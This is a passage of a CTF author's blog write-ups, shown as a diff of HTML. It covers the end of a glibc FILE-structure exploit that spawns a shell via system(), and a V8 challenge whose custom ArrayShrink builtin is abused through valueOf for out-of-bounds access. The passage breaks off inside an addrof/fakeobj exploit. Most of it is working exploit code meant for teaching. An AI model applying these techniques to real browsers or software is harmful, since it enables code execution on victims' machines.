+<span class="n">f</span><span class="p">.</span><span class="n">flags</span><span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\x04\x04</span><span class="s">;sh"</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="c1">#u64(b"\x04;sh\x00".ljust(8,b"\x00")) #0x68733bfbad4087 #u64(b"\x02;sh\x00".ljust(8,b"\x00"))  0x68733bfbad2887
+</span><span class="n">f</span><span class="p">.</span><span class="n">fileno</span><span class="o">=</span><span class="mi">1</span> <span class="c1"># libc.symbols["_IO_2_1_stderr_"]  ## this will go into the chain_ of stdout
+</span><span class="n">f</span><span class="p">.</span><span class="n">chain</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_2_1_stdin_"</span><span class="p">]</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_read_ptr</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_read_end</span> <span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_read_base</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x82</span> <span class="c1"># 0 #stdout+0x83
+</span><span class="n">f</span><span class="p">.</span><span class="n">_IO_write_base</span><span class="o">=</span><span class="mi">0</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_write_ptr</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"gets"</span><span class="p">]</span>  <span class="c1">#stdout+0x83+0x100
+</span><span class="n">f</span><span class="p">.</span><span class="n">_IO_write_end</span><span class="o">=</span><span class="mi">0</span> <span class="c1">#stdout+0x83
+</span><span class="n">f</span><span class="p">.</span><span class="n">_IO_buf_base</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_buf_end</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span><span class="o">+</span><span class="mi">1</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_offset</span><span class="o">=</span><span class="n">stdout</span> <span class="c1"># looks like this is widedata
+</span>
+<span class="c1"># f._codecvt=0x1122334455667788  ### for some reason this results in infinte loop
+</span>
+<span class="n">payload</span><span class="o">=</span><span class="nb">bytes</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="p">[:</span><span class="mh">0x70</span><span class="p">]</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_2_1_stdout_"</span><span class="p">]</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">payload</span><span class="p">[</span><span class="mh">0x78</span><span class="p">:]</span>  <span class="c1"># this to overwrite _chain
+#payload=payload[:0xc8]+p64(0x11223344)+payload[0xc8+8:]  # this for mode
+</span>
+<span class="c1">#f._mode=1 # mind this
+</span><span class="n">pause</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">8</span><span class="p">:])</span>
+<span class="n">pause</span><span class="p">()</span>
+
+ <span class="c1">################## second stage gets()
+</span>
+
+<span class="n">f</span><span class="p">.</span><span class="n">vtable</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_wfile_jumps"</span><span class="p">]</span><span class="o">+</span><span class="mh">0x18</span><span class="o">-</span><span class="mh">0x38</span>
+<span class="c1">#f._wide_data=stdout+0xe0-0xe0
+</span><span class="n">f</span><span class="p">.</span><span class="n">flags</span><span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\x04\x04</span><span class="s">;sh"</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="c1">#u64(b"\x04;sh\x00".ljust(8,b"\x00")) #0x68733bfbad4087 #u64(b"\x02;sh\x00".ljust(8,b"\x00"))  0x68733bfbad2887
+</span><span class="n">f</span><span class="p">.</span><span class="n">fileno</span><span class="o">=</span><span class="mi">1</span>
+<span class="c1">#f.chain=libc.symbols["_IO_2_1_stdin_"]
+</span><span class="s">'''f._IO_read_ptr=stdout+0x83
+f._IO_read_end =stdout+0x83
+f._IO_read_base=stdout+0x82 #stdout+0x83
+f._IO_write_base=stdout+0x'''</span>
+
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_read_ptr</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_read_end</span> <span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_read_base</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x82</span> <span class="c1"># 0 #stdout+0x83
+</span><span class="n">f</span><span class="p">.</span><span class="n">_IO_write_base</span><span class="o">=</span><span class="mi">0</span>
+
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_write_ptr</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span><span class="o">+</span><span class="mh">0x100</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_write_end</span><span class="o">=</span><span class="mi">0</span> <span class="c1">#stdout+0x83
+</span><span class="n">f</span><span class="p">.</span><span class="n">_IO_buf_base</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_buf_end</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span><span class="o">+</span><span class="mi">1</span>
+
+<span class="n">f</span><span class="p">.</span><span class="n">_wide_data</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0xe0</span><span class="o">-</span><span class="mh">0xe0</span>   <span class="o">-</span><span class="mh">0x28</span><span class="o">-</span><span class="mh">0x20</span><span class="o">-</span><span class="mh">0x18</span><span class="o">+</span><span class="mh">0x10</span><span class="o">+</span><span class="mi">8</span><span class="o">-</span><span class="mh">0x20</span><span class="o">-</span><span class="mh">0x10</span>
+<span class="n">f</span><span class="p">.</span><span class="n">chain</span><span class="o">=</span><span class="n">stdout</span><span class="o">-</span><span class="mi">8</span><span class="o">+</span><span class="mh">0xa8</span>
+<span class="c1">#f._IO_write_base=stdout+0x82
+</span><span class="n">payload</span><span class="o">=</span><span class="nb">bytes</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+
+
+<span class="n">f</span><span class="o">=</span><span class="n">FileStructure</span><span class="p">(</span><span class="n">null</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x00000000001e7000</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">stdout</span><span class="o">=</span><span class="n">stdout</span><span class="o">-</span><span class="mi">8</span><span class="o">+</span><span class="mh">0xa8</span>  <span class="c1"># libc.symbols["_IO_2_1_stdout_"]
+</span><span class="n">l</span><span class="o">=</span><span class="mh">0xe0</span>
+<span class="n">f</span><span class="p">.</span><span class="n">vtable</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_wfile_jumps"</span><span class="p">]</span><span class="o">+</span><span class="mh">0x18</span><span class="o">-</span><span class="mh">0x18</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_wide_data</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0xe0</span><span class="o">-</span><span class="mh">0xe0</span>
+<span class="n">f</span><span class="p">.</span><span class="n">flags</span><span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\x04\x04</span><span class="s">;sh"</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="c1">#u64(b"\x04;sh\x00".ljust(8,b"\x00")) #0x68733bfbad4087 #u64(b"\x02;sh\x00".ljust(8,b"\x00"))  0x68733bfbad2887
+</span><span class="n">f</span><span class="p">.</span><span class="n">fileno</span><span class="o">=</span><span class="mi">1</span>
+<span class="n">f</span><span class="p">.</span><span class="n">chain</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_2_1_stdin_"</span><span class="p">]</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_read_ptr</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_read_end</span> <span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_read_base</span><span class="o">=</span><span class="mi">0</span> <span class="c1">#stdout+0x83
+</span><span class="n">f</span><span class="p">.</span><span class="n">_IO_write_base</span><span class="o">=</span><span class="mi">0</span><span class="c1">#stdout+0x83
+</span><span class="n">f</span><span class="p">.</span><span class="n">_IO_write_ptr</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_write_end</span><span class="o">=</span><span class="mi">0</span> <span class="c1">#stdout+0x83
+</span><span class="n">f</span><span class="p">.</span><span class="n">_IO_buf_base</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_buf_end</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span><span class="o">+</span><span class="mi">1</span>
+<span class="n">payload2</span><span class="o">=</span><span class="nb">bytes</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\x04\x04</span><span class="s">;sh"</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span><span class="o">+</span><span class="n">payload</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mh">0xa8</span><span class="p">]</span><span class="o">+</span><span class="n">payload2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0xe0</span><span class="o">+</span><span class="mi">8</span><span class="o">-</span><span class="mh">0x68</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]))</span>
+
+<span class="c1">#p.sendline(b"a"*10)
+</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="note">note</h3>
+
+<p>i’m thinking of making this a heap house , its a very decent <code class="language-plaintext highlighter-rouge">large bin attack</code> vector , although it looks a bit like <code class="language-plaintext highlighter-rouge">just overwriting stderr</code> then causing a heap assetion (which is already widely used ) , this technique might get patched (or maybe already patched idk) . which makes _chain a very good alternative . So please if this technique is already ‘housed’ (maybe i missed it) or maybe widely used in the wild , dm me .</p>
+
+<hr />
+
+<h1 id="spells-manager">spells manager</h1>
+
+<p>i didn’t author this one , my friend <a href="https://retr0.tn/about/">retr0</a> did . Hopefully he posts his solution in the attached blog</p>
+
+<hr />
+
+<h1 id="sukunahikona">Sukunahikona</h1>
+
+<p>I’d like to apologize in advance.<br />
+I learned V8 exploitation the last week purely to birth this abomination of a challenge.<br />
+That’s all I could come up with 😭</p>
+
+<h3 id="source">source</h3>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BUILTIN</span><span class="p">(</span><span class="n">ArrayShrink</span><span class="p">)</span> <span class="p">{</span>
+<span class="o">+</span>  <span class="n">HandleScope</span> <span class="n">scope</span><span class="p">(</span><span class="n">isolate</span><span class="p">);</span>
+<span class="n">Factory</span> <span class="o">*</span><span class="n">factory</span> <span class="o">=</span> <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">factory</span><span class="p">();</span>
+<span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">receiver</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">receiver</span><span class="p">()</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">IsJSArray</span><span class="p">(</span><span class="o">*</span><span class="n">receiver</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">HasOnlySimpleReceiverElements</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">Cast</span><span class="o">&lt;</span><span class="n">JSArray</span><span class="o">&gt;</span><span class="p">(</span><span class="o">*</span><span class="n">receiver</span><span class="p">)))</span> <span class="p">{</span>
+  <span class="n">THROW_NEW_ERROR_RETURN_FAILURE</span><span class="p">(</span>
+    <span class="n">isolate</span><span class="p">,</span> <span class="n">NewTypeError</span><span class="p">(</span><span class="n">MessageTemplate</span><span class="o">::</span><span class="n">kPlaceholderOnly</span><span class="p">,</span>
+    <span class="n">factory</span><span class="o">-&gt;</span><span class="n">NewStringFromAsciiChecked</span><span class="p">(</span><span class="s">"Oldest trick in the book"</span><span class="p">))</span>
+  <span class="p">);</span>
+
+<span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSArray</span><span class="o">&gt;</span> <span class="n">array</span> <span class="o">=</span> <span class="n">Cast</span><span class="o">&lt;</span><span class="n">JSArray</span><span class="o">&gt;</span><span class="p">(</span><span class="n">receiver</span><span class="p">)</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">length</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">THROW_NEW_ERROR_RETURN_FAILURE</span><span class="p">(</span>
+    <span class="n">isolate</span><span class="p">,</span> <span class="n">NewTypeError</span><span class="p">(</span><span class="n">MessageTemplate</span><span class="o">::</span><span class="n">kPlaceholderOnly</span><span class="p">,</span>
+    <span class="n">factory</span><span class="o">-&gt;</span><span class="n">NewStringFromAsciiChecked</span><span class="p">(</span><span class="s">"specify length to shrink to "</span><span class="p">))</span>
+  <span class="p">);</span>
+
+
+<span class="kt">uint32_t</span> <span class="n">old_len</span> <span class="o">=</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">uint32_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">Object</span><span class="o">::</span><span class="n">NumberValue</span><span class="p">(</span><span class="n">array</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">()))</span>
+<span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">new_len_obj</span><span class="p">;</span>
+<span class="n">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">new_len_obj</span><span class="p">,</span> <span class="n">Object</span><span class="o">::</span><span class="n">ToNumber</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">at</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
+<span class="kt">uint32_t</span> <span class="n">new_len</span> <span class="o">=</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">uint32_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">Object</span><span class="o">::</span><span class="n">NumberValue</span><span class="p">(</span><span class="o">*</span><span class="n">new_len_obj</span><span class="p">));</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="n">new_len</span> <span class="o">&gt;=</span> <span class="n">old_len</span><span class="p">){</span>
+  <span class="n">THROW_NEW_ERROR_RETURN_FAILURE</span><span class="p">(</span>
+    <span class="n">isolate</span><span class="p">,</span> <span class="n">NewTypeError</span><span class="p">(</span><span class="n">MessageTemplate</span><span class="o">::</span><span class="n">kPlaceholderOnly</span><span class="p">,</span>
+    <span class="n">factory</span><span class="o">-&gt;</span><span class="n">NewStringFromAsciiChecked</span><span class="p">(</span><span class="s">"invalid length"</span><span class="p">))</span>
+  <span class="p">);</span>
+
+<span class="n">array</span><span class="o">-&gt;</span><span class="n">set_length</span><span class="p">(</span><span class="n">Smi</span><span class="o">::</span><span class="n">FromInt</span><span class="p">(</span><span class="n">new_len</span><span class="p">));</span>
+
+<span class="k">return</span> <span class="n">ReadOnlyRoots</span><span class="p">(</span><span class="n">isolate</span><span class="p">).</span><span class="n">undefined_value</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="bug">bug</h3>
+
+<ul>
+  <li>the bug lies in here <code class="language-plaintext highlighter-rouge">ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, new_len_obj, Object::ToNumber(isolate, args.at(1)));</code> what this does internally is call the <code class="language-plaintext highlighter-rouge">valueOf</code> property of the object . this is buggy because we it doesnt check beforehand the type of the parameter (HeapValue , object , smi …)</li>
+  <li>so we can do this</li>
+</ul>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="na">valueOf</span><span class="p">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+    <span class="c1">// do whatever you want</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">please rate our ctf at ctftime xd</span><span class="dl">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">30</span><span class="p">;</span>
+  <span class="p">},</span>
+<span class="p">};</span>
+<span class="nx">random_arr</span><span class="p">.</span><span class="nx">shrink</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>this is usefull because we can mess with the length of the array right before the added builtin sets the <code class="language-plaintext highlighter-rouge">length</code> again to our argument , in this case <code class="language-plaintext highlighter-rouge">30</code></p>
+  </li>
+  <li>what we can try to do is make the <code class="language-plaintext highlighter-rouge">elements</code> length smaller than the value we wanna shrink to , this way the new written length will cause an OOB.</li>
+  <li>
+    <p>however for that to be usefull , we need toi fulfill these conditions</p>
+
+    <ol>
+      <li>we need to reallocate our <code class="language-plaintext highlighter-rouge">elements</code> object , otherwise our oob will be within our old elements so it’s wont even be an OOB</li>
+      <li>the newly resized elements object , should have a lesser length than the shrink parameter</li>
+      <li>dont make the array <code class="language-plaintext highlighter-rouge">Holey</code> , because it wont reallocate our elements</li>
+    </ol>
+  </li>
+  <li>this can be done with this</li>
+</ul>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">a</span> <span class="o">=</span> <span class="p">[</span>
+  <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span>
+  <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span>
+  <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span>
+  <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span>
+<span class="p">];</span>
+
+<span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="na">valueOf</span><span class="p">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+    <span class="nx">a</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// this sets the elements in the array object to null (not the 0 but the array null) , so on next access will trigger a new allocation</span>
+    <span class="nx">a</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// if you do a[0]=1 , this will make the array holey which makes exploitation harder (i'm capping cause i didnt have time to solve it this way)</span>
+    <span class="k">return</span> <span class="mi">30</span><span class="p">;</span>
+  <span class="p">},</span>
+<span class="p">};</span>
+<span class="nx">a</span><span class="p">.</span><span class="nx">shrink</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span> <span class="c1">/// elements allocated length is now 1 , but our len == 30</span>
+<span class="c1">// OOB achieved</span>
+</code></pre></div></div>
+
+<ul>
+  <li>from there its a very typical OOB to achieve <code class="language-plaintext highlighter-rouge">addrof</code> and <code class="language-plaintext highlighter-rouge">fakeobj</code> primitive then <code class="language-plaintext highlighter-rouge">aar</code> and <code class="language-plaintext highlighter-rouge">aaw</code></li>
+  <li>commit is from 2024 (definitely didnt steal the template from pwn.college xd) so <code class="language-plaintext highlighter-rouge">ArrayBuffer.backingstore</code> approach is still viable .</li>
+  <li><strong>GGs</strong></li>
+</ul>
+
+<h3 id="exploit-3">exploit</h3>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// 8 byte array buffer</span>
+<span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// typeof(val) = float</span>
+  <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
+  <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="c1">// Watch for little endianness</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// typeof(val) = BigInt</span>
+  <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
+  <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="nx">a</span> <span class="o">=</span> <span class="p">[</span>
+  <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span>
+  <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span>
+  <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span>
+  <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span>
+<span class="p">];</span>
+
+<span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="na">valueOf</span><span class="p">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+    <span class="nx">a</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="nx">a</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">30</span><span class="p">;</span>
+  <span class="p">},</span>
+<span class="p">};</span>
+
+<span class="nx">a</span><span class="p">.</span><span class="nx">shrink</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>
+<span class="nx">to_modifie</span> <span class="o">=</span> <span class="p">[{}];</span>
+<span class="c1">///////////////////////////////////////////////////</span>
+<span class="kd">var</span> <span class="nx">packed_elements_map</span> <span class="o">=</span> <span class="mh">0x001cb8ed</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">double_float_array_map</span> <span class="o">=</span> <span class="mh">0x001cb86d</span><span class="p">;</span>
+<span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">to_modifie</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
+  <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">a</span><span class="p">[</span><span class="mi">20</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
